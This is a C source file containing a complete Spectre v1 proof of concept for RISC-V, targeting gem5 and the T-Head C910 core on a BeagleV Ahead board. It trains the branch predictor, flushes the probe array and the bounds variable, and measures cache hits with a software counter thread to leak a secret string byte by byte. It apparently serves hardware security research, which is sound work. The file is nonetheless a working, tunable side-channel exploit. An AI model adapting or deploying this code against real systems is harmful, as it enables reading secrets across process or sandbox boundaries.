/*
 * spectre_timerfree.c

 for gem5 and c910 riscv core on beagle v ahead board
 *
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>
#include <time.h>
#include <pthread.h>
#include "flush.h"


/* ═══════════════════════════════════════════════════════════════════════════
 * ① ALL TUNABLE PARAMETERS — change only this block
 * ═══════════════════════════════════════════════════════════════════════════ */

#define BENIGN_SIZE          50
#define SECRET               "Spectre_on_RISC-V_hardware!"
#define SECRET_SIZE          (sizeof(SECRET) - 1)

/*
 * Probe array geometry.
 * PAGE_SIZE must equal the OS page size (4096 on Linux/RV64) so that each
 * probe entry lives in a unique cache set.
 */
#define PAGE_SIZE            4096
#define CACHE_LINE_SIZE      64           /* C910 L1 D-cache line = 64 B    */
#define PROBE_ENTRIES        256
#define PROBE_SIZE           (PROBE_ENTRIES * PAGE_SIZE)  /* 1 MB total      */

/*
 * How many outer Spectre iterations to run per byte.
 * More rounds → higher confidence but slower.
 */
#define TRAIN_ROUNDS         300

/*
 * How many benign reads to perform before each attack round.
 * These train the branch predictor to predict "taken" (in-bounds) for the
 * bounds check inside read_content().
 */
#define TRAIN_BENIGN_ITER    50

/*
 * 1-in-N rounds is the actual malicious (out-of-bounds) access.
 * Remaining rounds are benign training.
 */
#define ATTACK_MODULUS       6

/*
 * Software-counter threshold (in ticks) below which we consider an access
 * a cache hit.
 *
 * Tune this:
 *   - Run with DEBUG_TIMING defined first to see real distributions.
 *   - On BeagleV-Ahead, start at 20.  Increase if too many false negatives,
 *     decrease if too many false positives.
 */
#define CACHE_HIT_THRESHOLD  20

/* ═══════════════════════════════════════════════════════════════════════════
 * ② GLOBAL DATA LAYOUT
 *   cache_barrierN arrays separate victim/probe_array/secret from each other
 *   in the cache (prevent accidental spatial prefetch correlation).
 * ═══════════════════════════════════════════════════════════════════════════ */

int     buf_size = BENIGN_SIZE;               /* bounds-check limit          */

static uint8_t cache_barrier1[512] = {0};
static char    victim[BENIGN_SIZE] = {1,2,3,4,5};
static uint8_t cache_barrier2[512] = {0};
static char    probe_array[PROBE_SIZE];       /* Flush+Reload measurement    */
static uint8_t cache_barrier3[512] = {0};
static char    secret_data[SECRET_SIZE];      /* data we want to leak        */

/* Prevent the compiler from discarding the barrier arrays                    */
static volatile uint8_t *use_barrier1 = cache_barrier1;
static volatile uint8_t *use_barrier2 = cache_barrier2;
static volatile uint8_t *use_barrier3 = cache_barrier3;

/* ═══════════════════════════════════════════════════════════════════════════
 * ③ SOFTWARE COUNTER THREAD
 *   Replaces rdcycle / rdtime CSRs as the timing oracle.
 *   Runs on the sibling C910 hart for minimum inter-core latency.
 * ═══════════════════════════════════════════════════════════════════════════ */

static volatile int      counter_active = 1;
static volatile uint64_t sw_counter     = 0;

static void *counter_thread_fn(void *arg)
{
    (void)arg;

    /*
     * Optional: pin counter thread to hart-1 so it doesn't compete with the
     * attack thread on the same core.  Requires _GNU_SOURCE + -lpthread.
     */
#ifdef __linux__
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);          /* hart-1 on BeagleV-Ahead                */
    pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
#endif

    while (counter_active) {
        sw_counter++;
        asm volatile("" ::: "memory");   /* prevent loop body removal       */
    }
    return NULL;
}

/*
 * Read the software counter with a RISC-V fence on both sides.
 * The fence ensures we don't reorder the load from sw_counter past the
 * probe_array access we are timing.
 */
static inline uint64_t read_counter(void)
{
    uint64_t v;
    asm volatile("fence" ::: "memory");
    v = sw_counter;
    asm volatile("fence" ::: "memory");
    return v;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ④ Flush CACHE PRIMITIVES (T-Head custom encodings and Zicbom extension for gem5)
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * DCACHE.CIVA a7
 * Encoding: 0x0278800b  (T-Head custom)
 * Flush + invalidate the D-cache line that contains *addr.
 * Required for the Flush step of Flush+Reload.


 * and for gem5 use zicbom extension and command cbo.flush
 */
// static inline void flush(void *addr)
// {
//     asm volatile(
//         "xor  a7, a7, a7   \n\t"
//         "add  a7, a7, %0   \n\t"
//         ".long 0x278800b   \n\t"     /* DCACHE.CIVA a7 */
//         : : "r"(addr) : "a7", "memory"
//     );
// }

/*
 * RISC-V fence (RW/RW) — order all pending memory accesses.
 * Called after the flush loop and before the attack access so that all
 * cache-invalidation effects are visible before we proceed.
 */
static inline void fence(void)
{
    asm volatile("fence" ::: "memory");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ⑤ SPECTRE V1 GADGET
 *   The CPU's branch predictor is trained to expect idx < buf_size.
 *   When buf_size is flushed from cache, the bounds check stalls, the
 *   predictor speculatively executes the body, and probe_array[secret * PAGE]
 *   is loaded into L1 D-cache before the mis-speculation is detected.
 * ═══════════════════════════════════════════════════════════════════════════ */

static char read_content(int idx)
{
    if (idx >= 0 && idx < buf_size) {
        uint8_t tmp = (uint8_t)victim[idx];
        return probe_array[(size_t)tmp * PAGE_SIZE];
    }
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ⑥ LEAK ONE BYTE
 * ═══════════════════════════════════════════════════════════════════════════ */

static int leak_byte(int offset, char *leak_out)
{
    assert(offset > 0 && offset > buf_size);

    int junk      = 1337;
    int hits[256] = {0};

    for (int j = 0; j < TRAIN_ROUNDS; j++) {

        /* ── A. Train branch predictor with benign in-bounds accesses ── */
        for (int i = TRAIN_BENIGN_ITER; i > 0; i--)
            junk ^= read_content(0);

        /* ── B. Flush entire probe_array from D-cache ───────────────── */
        for (size_t i = 0; i < PROBE_SIZE; i += CACHE_LINE_SIZE)
            flush(probe_array + i);

        fence();

        /* ── C. Flush buf_size — stalls the bounds check on next read ── */
        flush(&buf_size);
        fence();

        /* ── D. Compute index mux (branchless, avoids compiler leaking) ─
         *
         *  When (j % ATTACK_MODULUS) == 0  →  x = malicious_x (attack)
         *  Otherwise                       →  x = training_x  (benign)
         *
         *  Derivation (32-bit int arithmetic):
         *    step1 = ((j%M) - 1) & ~0xFFFF   — 0xFFFF0000 when j%M==0, else 0
         *    step2 = step1 | (step1 >> 16)    — 0xFFFFFFFF when j%M==0, else 0
         *    x     = training ^ (step2 & (malicious ^ training))
         */
        int training_x  = random() % BENIGN_SIZE;
        int malicious_x = offset;
        int x;

        x = ((j % ATTACK_MODULUS) - 1) & ~0xFFFF;
        x = (x | (x >> 16));
        x = training_x ^ (x & (malicious_x ^ training_x));

        junk ^= read_content(x);

        fence();

        /* ── E. Reload phase — measure with software counter ─────────── */
        volatile uint8_t dummy;

        for (int i = 0; i < PROBE_ENTRIES; i++) {
            /*
             * Shuffle access order so the hardware stride prefetcher cannot
             * pre-warm any probe entry before we measure it.
             */
            int idx = ((size_t)i * 167 + 13) & 255;

            uint64_t t0 = read_counter();
            dummy = (uint8_t)probe_array[(size_t)idx * PAGE_SIZE];
            uint64_t t1 = read_counter();
            (void)dummy;

            /*
             * Count as a cache hit if:
             *   • delta is below the threshold (fast access = line was cached)
             *   • idx is not the training index (training always ends in cache)
             */
            if ((t1 - t0) <= CACHE_HIT_THRESHOLD && idx != training_x)
                hits[idx]++;
        }
    }

    /* ── F. Select top-3 candidates ──────────────────────────────────── */
    int  top_hits[3]  = {0, 0, 0};
    char top_chars[3] = {0, 0, 0};

    for (int i = 30; i < 127; i++) {              /* printable ASCII range  */
        for (int k = 0; k < 3; k++) {
            if (hits[i] > top_hits[k]) {
                for (int l = 2; l > k; l--) {
                    top_hits[l]  = top_hits[l - 1];
                    top_chars[l] = top_chars[l - 1];
                }
                top_hits[k]  = hits[i];
                top_chars[k] = (char)i;
                break;
            }
        }
    }

    printf("  Top guesses:\n");
    for (int i = 0; i < 3; i++) {
        printf("    Rank %d: 0x%02x  '%c'  hits=%d\n",
               i + 1,
               (uint8_t)top_chars[i],
               (top_chars[i] >= 32 && top_chars[i] < 127) ? top_chars[i] : '?',
               top_hits[i]);
    }

    *leak_out = top_chars[0];
    return junk;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ⑦ INIT
 * ═══════════════════════════════════════════════════════════════════════════ */

static void init(void)
{
    srandom((unsigned)time(NULL));

    /* Fill probe_array with random non-zero bytes so probe entries don't
     * alias each other through zero-page optimisations.                      */
    for (int i = 0; i < PROBE_SIZE; i++)
        probe_array[i] = (char)(random() | 1);

    strncpy(victim,      "THIS_IS_BENIGN_CONTENT!", BENIGN_SIZE - 1);
    strncpy(secret_data, SECRET,                    SECRET_SIZE);

    /* Force the compiler to retain the barrier arrays                        */
    (void)*use_barrier1;
    (void)*use_barrier2;
    (void)*use_barrier3;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ⑧ D-CACHE COHERENCE PROBE  (run once at start to validate threshold)
 *   Measures hot-vs-cold delta on C910 using the software counter.
 *   Prints statistics so you can verify CACHE_HIT_THRESHOLD is appropriate.
 * ═══════════════════════════════════════════════════════════════════════════ */

static void probe_dcache_coherence(void)
{
    const int SAMPLES = 500;
    uint64_t hot_sum  = 0;
    uint64_t cold_sum = 0;
    volatile uint8_t dummy;

    printf("── D-cache coherence / timing probe ────────────────────────\n");
    printf("   Measuring hot vs cold access latency via software counter.\n");

    /* Hot measurements: access probe_array[0] in a tight loop             */
    (void)probe_array[0];     /* warm it first                              */
    for (int i = 0; i < SAMPLES; i++) {
        uint64_t t0 = read_counter();
        dummy = (uint8_t)probe_array[0];
        uint64_t t1 = read_counter();
        (void)dummy;
        hot_sum += (t1 - t0);
    }

    /* Cold measurements: flush then access                                 */
    for (int i = 0; i < SAMPLES; i++) {
        flush(probe_array);           /* evict from L1 D-cache              */
        fence();
        uint64_t t0 = read_counter();
        dummy = (uint8_t)probe_array[0];
        uint64_t t1 = read_counter();
        (void)dummy;
        cold_sum += (t1 - t0);
    }

    uint64_t hot_avg  = hot_sum  / SAMPLES;
    uint64_t cold_avg = cold_sum / SAMPLES;

    printf("   Hot  average  : %llu ticks\n", (unsigned long long)hot_avg);
    printf("   Cold average  : %llu ticks\n", (unsigned long long)cold_avg);
    printf("   Ratio         : %.1fx\n", (double)cold_avg / (hot_avg ? hot_avg : 1));
    printf("   CACHE_HIT_THRESHOLD = %d  → %s\n",
           CACHE_HIT_THRESHOLD,
           (CACHE_HIT_THRESHOLD > hot_avg && CACHE_HIT_THRESHOLD < cold_avg)
               ? "looks good"
               : "consider retuning (should sit between hot and cold averages)");
    printf("────────────────────────────────────────────────────────────\n\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ⑨ MAIN
 * ═══════════════════════════════════════════════════════════════════════════ */

int main(void)
{
    init();

    /* Start software counter thread BEFORE doing any measurements            */
    pthread_t tid;
    if (pthread_create(&tid, NULL, counter_thread_fn, NULL) != 0) {
        perror("pthread_create");
        return 1;
    }

    /* Allow counter thread to reach steady-state speed                       */
    struct timespec ts = {0, 10000000L};   /* 10 ms                          */
    nanosleep(&ts, NULL);

    probe_dcache_coherence();

    int  junk   = 0;
    char leaked[SECRET_SIZE + 1];
    memset(leaked, 0, sizeof(leaked));

    printf("Leaking: \"%s\" (%zu bytes)\n\n", SECRET, SECRET_SIZE);

    for (int i = 0; i < (int)SECRET_SIZE; i++) {
        printf("Byte %2d:\n", i);
        char curr = 0;
        junk ^= leak_byte((int)(secret_data - victim) + i, &curr);
        leaked[i] = curr;
        printf("  → leaked so far: [%s]\n\n", leaked);
    }

    printf("Final result: [%s]\n", leaked);

    counter_active = 0;
    pthread_join(tid, NULL);
    return junk;
}
